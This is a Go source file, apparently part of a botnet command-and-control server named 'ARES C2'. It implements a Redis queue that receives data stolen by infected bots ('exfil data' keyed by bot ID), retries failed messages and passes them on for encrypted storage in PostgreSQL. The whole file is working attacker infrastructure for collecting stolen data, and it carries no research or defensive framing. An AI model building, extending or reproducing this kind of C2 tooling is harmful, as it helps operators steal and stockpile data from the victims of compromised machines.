/*
 * ARES C2 — Redis Message Queue (v5.0 Overhaul)
 *
 * Publisher: Bot API pushes exfil data → Redis queue
 * Consumer: Worker goroutine reads queue → encrypts → stores in PostgreSQL
 *
 * This decouples I/O from HTTP handlers, preventing OOM under load.
 */

package queue

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/redis/go-redis/v9"
)

var ctx = context.Background()

const (
	QueueExfil = "ares:exfil"
	QueueTasks = "ares:tasks"
)

// ExfilMessage represents data pushed to the queue
type ExfilMessage struct {
	BotID     string          `json:"bot_id"`
	Type      string          `json:"type"`
	Data      json.RawMessage `json:"data"`
	Timestamp time.Time       `json:"timestamp"`
}

// Publisher pushes exfil data to Redis queue
type Publisher struct {
	rdb *redis.Client
}

func NewPublisher(redisURL string) (*Publisher, error) {
	opts, err := redis.ParseURL(redisURL)
	if err != nil {
		return nil, fmt.Errorf("redis parse URL: %w", err)
	}
	rdb := redis.NewClient(opts)
	if err := rdb.Ping(ctx).Err(); err != nil {
		return nil, fmt.Errorf("redis connect: %w", err)
	}
	log.Println("[QUEUE] Publisher connected to Redis")
	return &Publisher{rdb: rdb}, nil
}

func (p *Publisher) PublishExfil(msg *ExfilMessage) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	return p.rdb.LPush(ctx, QueueExfil, string(data)).Err()
}

func (p *Publisher) QueueLength() int64 {
	n, _ := p.rdb.LLen(ctx, QueueExfil).Result()
	return n
}

func (p *Publisher) Close() error {
	return p.rdb.Close()
}

// ── Consumer ──

// DataHandler is called by the consumer to process each message
type DataHandler func(msg *ExfilMessage) error

// Consumer reads exfil data from Redis and processes it
type Consumer struct {
	rdb     *redis.Client
	handler DataHandler
	running bool
}

func NewConsumer(redisURL string, handler DataHandler) (*Consumer, error) {
	opts, err := redis.ParseURL(redisURL)
	if err != nil {
		return nil, fmt.Errorf("redis parse URL: %w", err)
	}
	rdb := redis.NewClient(opts)
	if err := rdb.Ping(ctx).Err(); err != nil {
		return nil, fmt.Errorf("redis connect: %w", err)
	}
	log.Println("[QUEUE] Consumer connected to Redis")
	return &Consumer{rdb: rdb, handler: handler}, nil
}

// Run starts the consumer loop (blocking — run in goroutine)
func (c *Consumer) Run() {
	c.running = true
	log.Println("[QUEUE] Consumer worker started")
	for c.running {
		// Block-wait for new data (timeout 5s to check running flag)
		result, err := c.rdb.BRPop(ctx, 5*time.Second, QueueExfil).Result()
		if err != nil {
			if !strings.Contains(err.Error(), "redis: nil") {
				// Real error, not just timeout
				if c.running {
					log.Printf("[QUEUE] Consumer error: %v", err)
					time.Sleep(1 * time.Second)
				}
			}
			continue
		}

		// result[0] = queue name, result[1] = data
		var msg ExfilMessage
		if err := json.Unmarshal([]byte(result[1]), &msg); err != nil {
			log.Printf("[QUEUE] Invalid message: %v", err)
			continue
		}

		if err := c.handler(&msg); err != nil {
			log.Printf("[QUEUE] Handler error for bot %s: %v", msg.BotID, err)
			// Re-queue on failure (with retry limit via timestamp check)
			if time.Since(msg.Timestamp) < 10*time.Minute {
				c.rdb.LPush(ctx, QueueExfil, result[1])
			} else {
				log.Printf("[QUEUE] Message too old, dropping: bot=%s type=%s", msg.BotID, msg.Type)
			}
		}
	}
	log.Println("[QUEUE] Consumer worker stopped")
}

func (c *Consumer) Stop() {
	c.running = false
}

func (c *Consumer) Close() error {
	c.Stop()
	return c.rdb.Close()
}
